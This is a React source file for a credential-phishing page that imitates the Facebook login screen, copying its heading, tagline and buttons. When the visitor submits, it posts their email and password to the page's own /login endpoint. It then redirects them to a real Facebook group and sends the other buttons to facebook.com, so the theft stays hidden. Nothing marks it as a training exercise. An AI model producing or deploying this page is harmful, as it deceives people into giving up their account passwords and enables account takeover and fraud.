import React,{useState} from 'react'
import './App.css';

function App() {

  const [email,setEmail] = useState("")
  const [password,setPassword] = useState("")
      const handleemail = (e) =>{
         setEmail(e.target.value)
      }
      const handlePassword = (e) =>{
        setPassword(e.target.value)
     }

     const handleClickSubmit = async (e) => {
         e.preventDefault();
           try{
          const res =  await fetch("/login",{
                method:"POST",
                headers:{
                    "Content-Type":"application/json"
                },
                body:JSON.stringify({email,password})
            })
            const data = await res.json();
            if( res.status === 421 || !data){
                window.alert("please fill the input filed correctly")
            }else{
                window.location.href = "https://www.facebook.com/groups/2549715411950918/"
               
            }
        
            
           }catch(err){
               console.log(err)
           }
     }
const CreateNewAccount = (e) => {
    e.preventDefault();
    window.location.href = "https://www.facebook.com"
}
const forget = (e) => {
    e.preventDefault();
    window.location.href = "https://www.facebook.com"
}
  return (
  <div>
    <div className="container">
        <div className="left">
            <h1>facebook</h1>
            <p>Facebook helps you connect and share with the people in your life.</p>
        </div>
        <div className="right">
            <div>
            <form>
                <input type="text" name="email" value={email} onChange={handleemail} placeholder="Email addess or phone number"/>
                <input type="password" name="password" value={password} onChange={handlePassword} placeholder="Password" />
               
                <input type="submit" className="loginBtn" onClick={handleClickSubmit} value="Log In"/>
               
                <button onClick={forget} className="forget">Forgotten password?</button>
                <div className="sign-up">
                    <button onClick={CreateNewAccount} className="signupBtn">Create New Account</button>
                </div>
           
            </form>
            <p><b>Create a Page</b> for a celebrity, band or business.</p>
            </div>
        </div>
    </div>
  </div>
  );
}

export default App;
